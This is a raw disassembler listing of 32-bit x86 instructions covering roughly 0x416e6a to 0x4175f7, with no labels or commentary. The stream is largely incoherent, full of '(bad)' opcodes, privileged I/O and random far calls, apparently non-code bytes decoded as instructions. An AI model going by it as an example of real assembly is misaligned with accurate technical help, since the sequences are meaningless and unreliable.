  416e6a:	jns    0x416e18
  416e6c:	repnz pop ecx
  416e6e:	ret    
  416e6f:	adc    BYTE PTR [ecx],ah
  416e71:	fild   WORD PTR [ebx-0x63effc0c]
  416e77:	ins    BYTE PTR es:[edi],dx
  416e78:	push   es
  416e79:	call   0xd12b:0x7984677e
  416e80:	mov    ecx,?
  416e82:	mov    ebp,0x7142db04
  416e87:	inc    ecx
  416e88:	call   0xabf:0x7b42781c
  416e8f:	ret    
  416e90:	mov    WORD PTR [esi-0xb40d4d4],ss
  416e96:	push   esp
  416e97:	aad    0xd3
  416e99:	sbb    edx,DWORD PTR [ebp+edi*2-0x4d3c6e0f]
  416ea0:	dec    edi
  416ea1:	dec    ebx
  416ea2:	push   cs
  416ea3:	jle    0x416f22
  416ea5:	es aam 0x35
  416ea8:	add    ebx,DWORD PTR [esi+0x7c8f4ab]
  416eae:	popa   
  416eaf:	push   ds
  416eb0:	and    al,0x2f
  416eb2:	cwde   
  416eb3:	cli    
  416eb4:	xor    ecx,DWORD PTR [ebp+0x19]
  416eb7:	xor    esi,edx
  416eb9:	push   eax
  416eba:	xchg   edx,eax
  416ebb:	cdq    
  416ebc:	fimul  WORD PTR [edi]
  416ebe:	cmp    DWORD PTR [edi],0x78
  416ec1:	loopne 0x416f3e
  416ec3:	std    
  416ec4:	pop    ds
  416ec5:	or     eax,0x1c38f0ef
  416eca:	push   ebx
  416ecb:	loopne 0x416f1b
  416ecd:	inc    edi
  416ece:	fwait
  416ecf:	loope  0x416ef1
  416ed1:	scas   eax,DWORD PTR es:[edi]
  416ed2:	pop    es
  416ed3:	add    al,0xc9
  416ed5:	scas   eax,DWORD PTR es:[edi]
  416ed6:	pop    DWORD PTR [edx+ebx*1]
  416ed9:	push   eax
  416eda:	mul    BYTE PTR fs:[esi]
  416edd:	and    ebx,DWORD PTR [ebx+edx*8+0x3ed4e608]
  416ee4:	mov    edi,0x1362a55d
  416ee9:	out    dx,al
  416eea:	xchg   edx,eax
  416eeb:	neg    BYTE PTR [esi]
  416eed:	cmp    esp,DWORD PTR [ebp-0x1ab6fbf6]
  416ef3:	sbb    eax,0x989e13b7
  416ef8:	or     ebx,DWORD PTR [esp+eiz*8-0xc]
  416efc:	xchg   DWORD PTR [esi],edi
  416efe:	dec    edx
  416eff:	shl    BYTE PTR [esi+0x27],1
  416f02:	mov    esi,0x3efec191
  416f07:	(bad)  
  416f08:	xor    BYTE PTR [ecx+0x63c23147],ah
  416f0e:	test   DWORD PTR [esi-0x596bfe84],esi
  416f14:	cmp    ecx,DWORD PTR [edi-0x60]
  416f17:	ja     0x416f48
  416f19:	scas   al,BYTE PTR es:[edi]
  416f1a:	pop    ecx
  416f1b:	pop    ebx
  416f1c:	xor    DWORD PTR [edx-0xe],edi
  416f1f:	sub    DWORD PTR fs:[edx],esi
  416f22:	push   esi
  416f23:	or     edx,esi
  416f25:	mov    ch,0x94
  416f27:	jnp    0x416f89
  416f29:	pop    esp
  416f2a:	or     al,cl
  416f2c:	fwait
  416f2d:	ds call 0xcf0c:0x2ccb456f
  416f35:	test   esi,edx
  416f37:	and    DWORD PTR [ebx],0x46
  416f3a:	stos   BYTE PTR es:[edi],al
  416f3b:	call   0x72b365be
  416f40:	or     edi,esi
  416f42:	pop    DWORD PTR [edi-0x47]
  416f45:	stos   DWORD PTR es:[edi],eax
  416f46:	leave  
  416f47:	fwait
  416f48:	scas   al,BYTE PTR es:[edi]
  416f49:	xchg   esi,eax
  416f4a:	dec    esi
  416f4b:	cmp    al,BYTE PTR [eax]
  416f4d:	pop    edi
  416f4e:	int3   
  416f4f:	fiadd  DWORD PTR [edi+0x12aac72e]
  416f55:	shl    BYTE PTR [eax+0x9],1
  416f58:	call   DWORD PTR [edi+0x521e6d96]
  416f5e:	cwde   
  416f5f:	dec    edx
  416f60:	inc    ecx
  416f61:	cmp    BYTE PTR [edi],ah
  416f63:	xchg   ebp,eax
  416f64:	sub    eax,0x92231e9e
  416f69:	dec    edx
  416f6a:	jmp    0x416f16
  416f6c:	jecxz  0x416fc1
  416f6e:	inc    esi
  416f6f:	xor    eax,0xb2950d08
  416f74:	and    BYTE PTR [eax],ah
  416f76:	dec    ecx
  416f77:	push   ebp
  416f78:	and    esp,DWORD PTR [esi-0x53]
  416f7b:	push   0x71ad61ce
  416f80:	lods   al,BYTE PTR ds:[esi]
  416f81:	jl     0x416f96
  416f83:	xchg   esi,eax
  416f84:	hlt    
  416f85:	mov    eax,0xfd23d8ac
  416f8a:	ret    0xf4c9
  416f8d:	pop    edi
  416f8e:	into   
  416f8f:	sbb    eax,0x2be98be0
  416f94:	pop    ebp
  416f95:	mov    WORD PTR [edx+edi*8],gs
  416f98:	jp     0x416f9a
  416f9a:	pop    ebp
  416f9b:	and    ebp,DWORD PTR [edx]
  416f9d:	cmp    BYTE PTR [ebp-0x41d16893],cl
  416fa3:	pop    edx
  416fa4:	lods   eax,DWORD PTR ds:[esi]
  416fa5:	pop    edx
  416fa6:	mov    edx,DWORD PTR [edi]
  416fa8:	push   0x27
  416faa:	or     eax,0x2a2c9eaf
  416faf:	xor    bl,BYTE PTR [edi]
  416fb1:	xor    eax,0x718021a5
  416fb6:	inc    ebx
  416fb7:	(bad)  
  416fb8:	or     edi,DWORD PTR [ebx+edi*1]
  416fbb:	dec    ebx
  416fbc:	dec    ebp
  416fbd:	sub    dl,BYTE PTR [edx+0x2b53da94]
  416fc3:	xor    BYTE PTR [edi+0x2107155f],dh
  416fc9:	ret    0x8b27
  416fcc:	inc    eax
  416fcd:	sub    BYTE PTR [edx+0x38],ch
  416fd0:	jmp    0xe253abdf
  416fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd6:	fldln2 
  416fd8:	not    DWORD PTR [ecx+0x7a8aee24]
  416fde:	aam    0x23
  416fe0:	icebp  
  416fe1:	not    DWORD PTR [esi]
  416fe3:	adc    BYTE PTR [ecx],ah
  416fe5:	sub    cl,BYTE PTR [esi+esi*4+0x28]
  416fe9:	xchg   ebp,eax
  416fea:	shl    BYTE PTR [eax-0x4f],1
  416fed:	popf   
  416fee:	mov    DWORD PTR [edi-0x5],edi
  416ff1:	adc    DWORD PTR [ebp+0x69b3c5a],edx
  416ff7:	je     0x416f96
  416ff9:	mov    edi,0x15c89782
  416ffe:	mov    edx,0x59418b82
  417003:	sbb    al,bh
  417005:	call   0xd749:0xa16ce86d
  41700c:	(bad)  
  41700d:	ret    
  41700e:	iret   
  41700f:	hlt    
  417010:	push   es
  417011:	pop    esi
  417012:	xchg   DWORD PTR [ebp-0x7678adf6],edx
  417018:	je     0x417038
  41701a:	inc    edx
  41701b:	leave  
  41701c:	ss ds iret 
  41701f:	sbb    eax,0x95bac0ab
  417024:	xchg   esp,eax
  417025:	call   0xc147c55f
  41702a:	xor    DWORD PTR [ebp+0x576da460],0x8fbaa28d
  417034:	mov    BYTE PTR [edi+edx*4+0x6c],cl
  417038:	mov    edx,0x4358a8
  41703d:	fiadd  WORD PTR [edx+0x678d85f4]
  417043:	mov    esi,es
  417045:	(bad)  
  417046:	push   ss
  417047:	daa    
  417048:	ins    BYTE PTR es:[edi],dx
  417049:	inc    esi
  41704a:	popa   
  41704b:	hlt    
  41704c:	xchg   ecx,eax
  41704d:	(bad)  
  41704f:	push   es
  417050:	xchg   edx,eax
  417051:	out    0x97,al
  417053:	scas   eax,DWORD PTR es:[edi]
  417054:	mov    ah,0xcb
  417056:	pusha  
  417057:	pop    eax
  417058:	add    edx,DWORD PTR [edi-0x5f]
  41705b:	addr16 (bad) 
  41705d:	out    dx,al
  41705e:	nop
  41705f:	ins    BYTE PTR es:[edi],dx
  417060:	add    DWORD PTR [ecx],ecx
  417062:	cmp    ah,cl
  417064:	inc    edi
  417065:	inc    esp
  417066:	push   ss
  417067:	cmp    BYTE PTR [esi],bl
  417069:	add    al,0x7c
  41706b:	inc    edi
  41706c:	cdq    
  41706d:	push   ebx
  41706e:	xor    al,0xca
  417070:	push   ebp
  417071:	jp     0x417015
  417073:	out    dx,al
  417074:	and    dh,ch
  417076:	in     al,dx
  417077:	inc    ecx
  417078:	sub    al,0xb8
  41707a:	inc    DWORD PTR [eax+0x3246d4ae]
  417080:	mov    ecx,0x2530fd3b
  417085:	int3   
  417086:	std    
  417087:	pop    ss
  417088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417089:	mov    eax,0x8188e65d
  41708e:	aaa    
  41708f:	pop    ds
  417090:	xor    eax,0xe0aadc57
  417095:	pop    edi
  417096:	xchg   esp,eax
  417097:	jae    0x4170db
  417099:	stos   DWORD PTR es:[edi],eax
  41709a:	dec    ebp
  41709b:	push   es
  41709c:	call   0xf83f65e8
  4170a1:	push   edi
  4170a2:	pusha  
  4170a3:	xor    eax,0x19f7f9ed
  4170a8:	cdq    
  4170a9:	mov    ah,0x88
  4170ab:	test   al,0x97
  4170ad:	iret   
  4170ae:	popa   
  4170af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170b0:	adc    esi,DWORD PTR [eax-0x64]
  4170b3:	outs   dx,WORD PTR ds:[esi]
  4170b5:	adc    al,0x20
  4170b7:	ret    0x4279
  4170ba:	jno    0x41705c
  4170bc:	outs   dx,DWORD PTR ds:[esi]
  4170bd:	pusha  
  4170be:	adc    BYTE PTR [ecx-0x13],dh
  4170c1:	(bad)  
  4170c3:	xor    bl,BYTE PTR [edx]
  4170c5:	int3   
  4170c6:	aaa    
  4170c7:	ja     0x417098
  4170c9:	lds    ecx,FWORD PTR [edx-0x573fe97]
  4170cf:	jp     0x41711d
  4170d1:	adc    al,0x34
  4170d3:	outs   dx,DWORD PTR ds:[esi]
  4170d4:	jnp    0x417111
  4170d6:	or     eax,0x5160d8e0
  4170db:	repnz fst DWORD PTR [ebx+esi*8]
  4170df:	and    al,0xf2
  4170e1:	fiadd  WORD PTR [eax]
  4170e3:	out    dx,eax
  4170e4:	rol    ch,0xe0
  4170e7:	retf   
  4170e8:	call   0x525a84ea
  4170ed:	inc    esi
  4170ee:	fistp  QWORD PTR [eax-0x4c]
  4170f1:	lods   eax,DWORD PTR ds:[esi]
  4170f2:	(bad)  
  4170f3:	scas   eax,DWORD PTR es:[edi]
  4170f4:	loopne 0x417113
  4170f6:	cs or  ecx,esp
  4170f9:	test   DWORD PTR [ebx+0x68],edx
  4170fc:	xor    al,0xb0
  4170fe:	int    0xb3
  417100:	cmp    bh,ah
  417102:	fwait
  417103:	inc    esi
  417104:	inc    esp
  417105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417106:	sbb    cl,BYTE PTR [ebx-0x6a]
  417109:	add    eax,0xacccd3f5
  41710e:	inc    ebx
  41710f:	iret   
  417110:	cli    
  417111:	dec    ebp
  417112:	imul   BYTE PTR ds:[ebx-0x7e]
  417116:	xlat   BYTE PTR ds:[ebx]
  417117:	sbb    BYTE PTR [eax+0x5bf85dbd],ch
  41711d:	jl     0x41718e
  41711f:	mov    dl,0x89
  417121:	hlt    
  417122:	sbb    BYTE PTR [ebx+edx*2],0x5b
  417126:	jae    0x4170e2
  417128:	pop    es
  417129:	rol    BYTE PTR [ebx],cl
  41712b:	dec    edx
  41712c:	inc    ebx
  41712d:	(bad)  
  41712e:	rcl    BYTE PTR [ecx-0x4e8250a0],1
  417134:	test   BYTE PTR [ebx],cl
  417136:	jp     0x417130
  417138:	ret    
  417139:	sahf   
  41713a:	int    0xda
  41713c:	inc    edi
  41713d:	lock scas al,BYTE PTR es:[edi]
  41713f:	push   0x8441643b
  417144:	pop    edi
  417145:	addr16 cmc 
  417147:	xchg   esp,eax
  417148:	es xor eax,0x11acb924
  41714e:	sbb    al,0x32
  417150:	arpl   WORD PTR [esi+esi*2+0x1a8136b8],bp
  417157:	adc    bh,BYTE PTR [ebx]
  417159:	pop    eax
  41715a:	sub    eax,0x41122b1
  41715f:	pop    esp
  417160:	jbe    0x4170ef
  417162:	hlt    
  417163:	icebp  
  417164:	sub    DWORD PTR [edi-0x1e2f6b30],0x204cfb71
  41716e:	(bad)  
  41716f:	imul   edx,DWORD PTR [esi],0x86dad77c
  417175:	in     eax,0x4e
  417177:	aam    0x7c
  417179:	into   
  41717a:	hlt    
  41717b:	cmp    eax,0x2285b868
  417180:	pusha  
  417181:	in     eax,0xc7
  417183:	in     eax,0x83
  417185:	xor    DWORD PTR [edi+eiz*4+0xa],ebp
  417189:	push   edi
  41718a:	xchg   edx,eax
  41718b:	(bad)  
  41718c:	mov    bl,0xfd
  41718e:	ficomp DWORD PTR [edx]
  417190:	and    esp,DWORD PTR [ecx+0x45]
  417193:	mov    DWORD PTR [edx+0x66],edx
  417196:	sahf   
  417197:	cwde   
  417198:	ja     0x4171a0
  41719a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41719b:	xchg   ebp,eax
  41719c:	rcr    BYTE PTR [ecx+edx*1-0x38],1
  4171a0:	mov    al,0x8c
  4171a2:	test   DWORD PTR [ebx+0x43],ebp
  4171a5:	or     BYTE PTR [eax-0x61],dl
  4171a8:	xchg   ebp,eax
  4171a9:	paddq  mm6,QWORD PTR [ecx+0x28]
  4171ad:	dec    esi
  4171ae:	aas    
  4171af:	xchg   esi,eax
  4171b0:	mov    bl,0x83
  4171b2:	(bad)  
  4171b3:	cs add al,0x63
  4171b6:	xor    ecx,DWORD PTR [edx+edi*1-0x4a]
  4171ba:	and    edx,ebx
  4171bc:	mov    ch,BYTE PTR [ebx]
  4171be:	scas   al,BYTE PTR es:[edi]
  4171bf:	fimul  DWORD PTR [edx-0x26]
  4171c2:	iret   
  4171c3:	inc    edi
  4171c4:	icebp  
  4171c5:	dec    edx
  4171c6:	push   ebx
  4171c7:	cdq    
  4171c8:	out    dx,al
  4171c9:	pushf  
  4171ca:	clc    
  4171cb:	data16 ja 0x4171d9
  4171ce:	fs and al,0x63
  4171d1:	push   ecx
  4171d2:	outs   dx,BYTE PTR ds:[esi]
  4171d3:	xor    al,al
  4171d5:	cmp    al,0xc3
  4171d7:	into   
  4171d8:	(bad)  
  4171d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171da:	or     cl,cl
  4171dc:	leave  
  4171dd:	inc    edi
  4171de:	pop    edx
  4171df:	popa   
  4171e0:	adc    ah,bh
  4171e2:	lods   al,BYTE PTR ds:[esi]
  4171e3:	shr    esi,1
  4171e5:	jmp    0x4751:0x516610f
  4171ec:	call   0x1ea81a92
  4171f1:	sbb    al,0xa4
  4171f3:	xor    BYTE PTR [ecx],bh
  4171f5:	or     bl,al
  4171f7:	pop    esi
  4171f8:	inc    esi
  4171f9:	mov    dl,0x45
  4171fb:	sbb    DWORD PTR [eax],0xffffffd2
  4171fe:	mov    dh,0x1a
  417200:	or     DWORD PTR [esi],eax
  417202:	or     eax,0xbea2c39a
  417207:	push   edi
  417208:	loope  0x41719d
  41720a:	(bad)  
  41720b:	dec    edx
  41720c:	cli    
  41720d:	dec    eax
  41720e:	ret    
  41720f:	(bad)  
  417210:	sub    eax,0x6ef2c5f2
  417215:	jmp    0x2c44:0xb77ddaa5
  41721c:	aam    0x69
  41721e:	add    al,0xf1
  417220:	mov    ecx,DWORD PTR [esi-0x7646dd5d]
  417226:	xchg   ecx,eax
  417227:	outs   dx,BYTE PTR ds:[esi]
  417228:	(bad)  [ebx]
  41722a:	inc    esi
  41722b:	pop    ds
  41722c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41722d:	loopne 0x417206
  41722f:	sub    DWORD PTR [ecx],0xb0bde70a
  417235:	test   DWORD PTR [esi],eax
  417237:	xor    eax,0x8f4a1591
  41723c:	call   0x8f0b39e0
  417241:	inc    ebx
  417242:	cdq    
  417243:	xchg   ecx,eax
  417244:	pop    ebx
  417245:	xor    al,dl
  417247:	sub    DWORD PTR [eax],edi
  417249:	fwait
  41724a:	mov    ds:0x1c45a2e2,al
  41724f:	fisubr DWORD PTR [esp+0x69c3456b]
  417256:	stc    
  417257:	push   cs
  417258:	js     0x417283
  41725a:	ins    BYTE PTR es:[edi],dx
  41725b:	push   ss
  41725c:	pop    esi
  41725d:	xor    eax,0x72e1deaa
  417262:	test   eax,0x494755ad
  417267:	stc    
  417268:	clc    
  417269:	iret   
  41726a:	call   0x4a5d897e
  41726f:	or     DWORD PTR [edi+0x4c80aa9c],0xffffffdd
  417276:	and    al,0xdb
  417278:	push   esi
  417279:	cmp    dl,0x94
  41727c:	or     esi,esi
  41727e:	std    
  41727f:	mov    dh,0xeb
  417281:	dec    ebx
  417282:	pop    ebp
  417283:	ret    
  417284:	add    ah,BYTE PTR [ecx+0x67]
  417287:	mov    ?,WORD PTR [esi+0x52]
  41728a:	cmp    DWORD PTR [ebp-0xc4d51c9],ebp
  417290:	call   0x36c28416
  417295:	test   DWORD PTR [ecx-0x72],edi
  417298:	test   BYTE PTR [ecx+edi*1-0x3a],ah
  41729c:	dec    ecx
  41729d:	push   ss
  41729e:	lods   eax,DWORD PTR ds:[esi]
  41729f:	(bad)
  4172a2:	adc    esi,DWORD PTR ds:0xf3d41a48
  4172a8:	loop   0x417306
  4172aa:	mov    bl,0xfc
  4172ac:	aam    0xaa
  4172ae:	jg     0x41728c
  4172b0:	outs   dx,DWORD PTR ds:[esi]
  4172b1:	retf   0xcfea
  4172b4:	jmp    0x417309
  4172b6:	jbe    0x4172f7
  4172b8:	xchg   edx,eax
  4172b9:	push   0xffffff84
  4172bb:	fldcw  WORD PTR [eax+0x74]
  4172be:	mov    ebp,fs
  4172c0:	enter  0x22e8,0xab
  4172c4:	out    dx,eax
  4172c5:	loopne 0x417312
  4172c7:	inc    edx
  4172c8:	inc    edi
  4172c9:	ins    BYTE PTR es:[edi],dx
  4172ca:	bound  ebx,QWORD PTR [edx]
  4172cc:	popa   
  4172cd:	sbb    al,0xeb
  4172cf:	fisubr DWORD PTR [eax+0x5478a7f7]
  4172d5:	jmp    0x4172ea
  4172d7:	jge    0x41730c
  4172d9:	outs   dx,DWORD PTR ds:[esi]
  4172da:	push   ds
  4172db:	push   ds
  4172dc:	imul   ebx,ebp,0x4704e31b
  4172e2:	inc    edx
  4172e3:	icebp  
  4172e4:	retf   
  4172e5:	xor    ch,BYTE PTR [esi+0x46ba69da]
  4172eb:	sub    al,0xc1
  4172ed:	push   esi
  4172ee:	push   eax
  4172ef:	rep stos DWORD PTR es:[edi],eax
  4172f1:	push   edi
  4172f2:	inc    edx
  4172f3:	shl    BYTE PTR [edi],0x88
  4172f6:	fnsave [eax-0x1c]
  4172f9:	cmp    al,0xb0
  4172fb:	dec    ah
  4172fd:	ret    
  4172fe:	and    al,0xd2
  417300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417301:	neg    eax
  417303:	ja     0x417357
  417305:	sub    bh,BYTE PTR [ecx-0x5b8ed68e]
  41730b:	test   DWORD PTR [ebx-0xad8e2e0],ecx
  417311:	xor    ebx,DWORD PTR [ebx-0x11]
  417314:	mov    dl,0x15
  417316:	lds    eax,FWORD PTR [edx]
  417318:	adc    DWORD PTR [eax],edx
  41731a:	jbe    0x4172bc
  41731c:	pop    esi
  41731d:	or     eax,0xbea175d2
  417322:	or     ch,bh
  417324:	jnp    0x4172b2
  417326:	fdiv   QWORD PTR [ecx-0xc]
  417329:	aad    0xf0
  41732b:	adc    DWORD PTR [ecx+0x31],ebp
  41732e:	push   es
  41732f:	adc    dl,ch
  417331:	and    DWORD PTR [edi],ebp
  417333:	lds    eax,FWORD PTR [edx-0x13]
  417336:	add    dh,bh
  417338:	xor    ebp,esp
  41733a:	(bad)  
  41733b:	pop    ebx
  41733c:	jg     0x417302
  41733e:	(bad)
  417341:	iret   
  417342:	out    0x79,al
  417344:	adc    al,dh
  417346:	arpl   WORD PTR [edi+0x2955a6a4],di
  41734c:	sub    al,0x32
  41734e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41734f:	push   edx
  417350:	xor    bl,dl
  417352:	rcl    BYTE PTR [esi],cl
  417354:	mov    ch,0xb
  417356:	push   edx
  417357:	mov    dh,0x70
  417359:	xchg   edi,eax
  41735a:	in     al,dx
  41735b:	cmp    esi,ecx
  41735d:	in     eax,dx
  41735e:	mov    esp,0xb86f6f7c
  417363:	sub    BYTE PTR [eax-0x28],cl
  417366:	push   cs
  417367:	sbb    BYTE PTR [ebp+0x23],0x35
  41736b:	(bad)  
  41736c:	(bad)  
  41736d:	test   ebx,0xce9c3f94
  417373:	popf   
  417374:	sar    BYTE PTR [eax+ebp*1],cl
  417377:	pop    ss
  417378:	and    ch,BYTE PTR [edi+0x1adb54d5]
  41737e:	push   0x8cc914da
  417383:	in     al,dx
  417384:	mov    ecx,0x2ccfbc67
  417389:	adc    edx,ebp
  41738b:	nop
  41738c:	jge    0x417310
  41738e:	push   0x10
  417390:	jp     0x4173b8
  417392:	jae    0x417338
  417394:	imul   ebp,DWORD PTR [ecx+eax*1],0xffffff9f
  417398:	(bad)  
  41739a:	outs   dx,DWORD PTR ds:[esi]
  41739b:	xchg   ecx,esi
  41739d:	hlt    
  41739e:	pop    ecx
  41739f:	out    dx,eax
  4173a0:	pop    es
  4173a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173a2:	mov    cs,eax
  4173a4:	push   esi
  4173a5:	loop   0x417409
  4173a7:	aam    0xb9
  4173a9:	cmc    
  4173aa:	xor    esi,DWORD PTR [eax+0x6d]
  4173ad:	fmul   QWORD PTR [edi-0x7c]
  4173b0:	rol    DWORD PTR [edx-0x4db48508],1
  4173b6:	adc    al,0xc7
  4173b8:	lds    ebp,FWORD PTR [esi+ebp*4]
  4173bb:	push   es
  4173bc:	adc    eax,0x3348558
  4173c1:	sub    al,0xf0
  4173c3:	mov    esp,0xe23d769a
  4173c8:	cmp    eax,0x8f275fef
  4173cd:	pop    ecx
  4173ce:	sbb    al,0x25
  4173d0:	in     eax,0x74
  4173d2:	pop    esp
  4173d3:	jns    0x417393
  4173d5:	or     BYTE PTR [eax-0x22],ch
  4173d8:	mov    ch,0x7c
  4173da:	sahf   
  4173db:	push   0xffffff99
  4173dd:	pop    edi
  4173de:	mov    ebx,0x74042f07
  4173e3:	add    ebx,edi
  4173e5:	jg     0x41737e
  4173e7:	ss fs popa 
  4173ea:	sub    al,0x8a
  4173ec:	xchg   esp,eax
  4173ed:	mov    ebp,0xa268f930
  4173f2:	adc    edx,DWORD PTR ds:0xcbd001fc
  4173f8:	out    0xa1,eax
  4173fa:	das    
  4173fb:	out    0xfb,eax
  4173fd:	(bad)  
  4173fe:	push   esp
  4173ff:	dec    esi
  417400:	repnz push ss
  417402:	(bad)  
  417404:	jns    0x4173b9
  417406:	test   eax,0x76563c88
  41740b:	add    BYTE PTR [ebx+0x265808f1],bl
  417411:	inc    BYTE PTR [edx+0x82bd274]
  417417:	(bad)  
  417418:	push   eax
  417419:	ret    
  41741a:	cmpxchg BYTE PTR [edi+0x61c6c86c],cl
  417421:	lock retf 0x9fc5
  417425:	sub    al,0x50
  417427:	jo     0x4174a5
  417429:	adc    edx,DWORD PTR [ebx]
  41742b:	clc    
  41742c:	or     al,BYTE PTR [ebp+0x31]
  41742f:	jp     0x41744f
  417431:	push   edi
  417432:	mov    ds:0x15558146,eax
  417437:	int    0x8e
  417439:	cmp    DWORD PTR [bx+0x2896],0x47
  41743f:	in     al,0xde
  417441:	mov    ah,0x87
  417443:	iret   
  417444:	pop    eax
  417445:	sbb    al,0x52
  417447:	inc    esp
  417448:	ins    BYTE PTR es:[edi],dx
  417449:	xchg   ebp,eax
  41744a:	jg     0x4174bd
  41744c:	mov    esp,0xc27cce75
  417451:	dec    eax
  417452:	addr16 mov bh,0x48
  417455:	mov    al,ds:0xbd1aa46b
  41745a:	cld    
  41745b:	xchg   esi,eax
  41745c:	pop    eax
  41745d:	hlt    
  41745e:	ins    BYTE PTR es:[edi],dx
  41745f:	cli    
  417460:	mov    fs,WORD PTR [esi-0x4e]
  417463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417464:	adc    eax,0x94976e81
  417469:	addr16 ror ebp,0xfa
  41746d:	inc    ebp
  41746e:	pop    esp
  41746f:	push   cs
  417470:	int3   
  417471:	call   0xc7585f0
  417476:	pushf  
  417477:	xor    BYTE PTR ds:0xa54bb103,bh
  41747d:	hlt    
  41747e:	jb     0x4174e8
  417480:	stos   DWORD PTR es:[edi],eax
  417481:	fs mov ebx,0xeea78726
  417487:	sub    al,0x3b
  417489:	add    edi,esp
  41748b:	aad    0x81
  41748d:	out    0x86,eax
  41748f:	xchg   edi,eax
  417490:	sahf   
  417491:	test   al,0x2
  417493:	xchg   ebp,eax
  417494:	call   0x3f83:0x7bc9c6c5
  41749b:	jge    0x417428
  41749d:	mov    eax,ds:0x3be5c963
  4174a2:	xchg   esi,eax
  4174a3:	cwde   
  4174a4:	dec    esp
  4174a5:	push   0x5e397007
  4174aa:	or     cl,BYTE PTR [eax+ebx*8]
  4174ad:	(bad)  
  4174ae:	cmp    ebx,ecx
  4174b0:	fmul   st(7),st
  4174b2:	or     bl,BYTE PTR [ebp+edx*4+0x378f9d78]
  4174b9:	sbb    edi,DWORD PTR [edi+0x6227a0ba]
  4174bf:	hlt    
  4174c0:	xor    eax,0x8fe2acda
  4174c5:	sbb    DWORD PTR [ebx-0x3f],esi
  4174c8:	arpl   WORD PTR [edx],di
  4174ca:	(bad)  
  4174cc:	xor    al,0xb0
  4174ce:	inc    edx
  4174cf:	jle    0x4174d5
  4174d1:	daa    
  4174d2:	and    esi,DWORD PTR [ebp+0x56]
  4174d5:	mov    WORD PTR [edx-0x63],cs
  4174d8:	ins    DWORD PTR es:[edi],dx
  4174d9:	add    edi,DWORD PTR [eax-0x136fdd8a]
  4174df:	mov    edx,0x73496776
  4174e4:	cmp    dl,BYTE PTR [esi]
  4174e6:	mov    esi,0x8b1b2ba3
  4174eb:	or     eax,0x120e5f89
  4174f0:	dec    esi
  4174f1:	xor    ch,BYTE PTR [ebx+0x2]
  4174f4:	and    BYTE PTR [edi-0x37],ch
  4174f7:	cs jmp 0x41755c
  4174fa:	pushf  
  4174fb:	pop    eax
  4174fc:	push   esp
  4174fd:	rcr    DWORD PTR [edx+0xd],1
  417500:	cmp    eax,0x83e655ed
  417505:	xchg   esi,eax
  417506:	xchg   ecx,eax
  417507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417508:	into   
  417509:	mov    al,ds:0xa9dad4a6
  41750e:	pop    edi
  41750f:	push   esp
  417510:	pop    edi
  417511:	clc    
  417512:	mov    eax,ds:0x730d0a6d
  417517:	popf   
  417518:	in     al,0xf2
  41751a:	or     dh,dh
  41751c:	add    eax,0x5d414dc2
  417521:	ss jmp 0x84db:0xb32a88cc
  417529:	mov    bl,0x91
  41752b:	cwde   
  41752c:	mov    ecx,0xa7a73377
  417531:	shl    ah,cl
  417533:	cmp    esp,DWORD PTR [edi+0x164e238]
  417539:	test   al,0x5d
  41753b:	test   BYTE PTR ds:0x71b1f3f1,dl
  417541:	retf   
  417542:	mov    ds:0x79428357,al
  417547:	xchg   DWORD PTR [esp+ebx*8+0x1c5ae81e],ebp
  41754e:	pusha  
  41754f:	fst    DWORD PTR [ecx]
  417551:	pop    edi
  417552:	mov    dh,0x54
  417554:	cdq    
  417555:	call   0xa3d3:0xbabfcca6
  41755c:	or     DWORD PTR ds:0x3acf52de,edi
  417562:	(bad)  
  417563:	loop   0x417537
  417565:	pushf  
  417566:	mov    eax,0x86966831
  41756b:	push   cs
  41756c:	sahf   
  41756d:	loop   0x417516
  41756f:	pop    edx
  417570:	int    0xf5
  417572:	mov    ebx,DWORD PTR [ecx+0x7e]
  417575:	dec    eax
  417576:	ds test bl,bh
  417579:	cdq    
  41757a:	mov    eax,ds:0x1585a674
  41757f:	push   0xffffffef
  417581:	cmp    BYTE PTR [esp+edx*4+0x2f],dh
  417585:	mov    al,ds:0xa37ce158
  41758a:	jb     0x41752d
  41758c:	shr    BYTE PTR [ebx+0x33],1
  41758f:	(bad)  
  417591:	not    BYTE PTR [ebx-0x1aeceda1]
  417597:	dec    ebp
  417598:	push   ebp
  417599:	mov    ebp,0x93b4ebcc
  41759e:	jl     0x41756e
  4175a0:	loopne 0x417530
  4175a2:	es jmp 0xe68159b2
  4175a8:	jbe    0x417544
  4175aa:	in     al,dx
  4175ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ac:	bound  ebx,QWORD PTR [ebx]
  4175ae:	dec    ebx
  4175af:	pop    ecx
  4175b0:	push   ds
  4175b1:	pop    esi
  4175b2:	mov    esi,0x3982d517
  4175b7:	lods   al,BYTE PTR ds:[esi]
  4175b8:	scas   al,BYTE PTR es:[edi]
  4175b9:	imul   ecx,eax,0xffffffff
  4175bc:	das    
  4175bd:	and    al,0x1f
  4175bf:	mov    eax,0x14871c9a
  4175c4:	jno    0x41758e
  4175c6:	sub    ch,0x4f
  4175c9:	mov    al,ds:0x8f36579c
  4175ce:	inc    ecx
  4175cf:	sbb    ebx,DWORD PTR ds:[edi-0xe]
  4175d3:	ss clc 
  4175d5:	cmp    al,ah
  4175d7:	test   al,0x7f
  4175d9:	xchg   ecx,eax
  4175da:	and    al,0x91
  4175dc:	xor    DWORD PTR [edi-0x5b],eax
  4175df:	dec    edi
  4175e0:	in     al,0x42
  4175e2:	jle    0x417661
  4175e4:	push   ebp
  4175e5:	aad    0xe4
  4175e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175e8:	pop    ecx
  4175e9:	sub    DWORD PTR [ebp-0x71d59888],esi
  4175ef:	fisubr WORD PTR [edi+0x3]
  4175f2:	pop    esp
  4175f3:	fwait
  4175f4:	stc    
  4175f5:	int    0x7b
  4175f7:	mov    cl,0x89
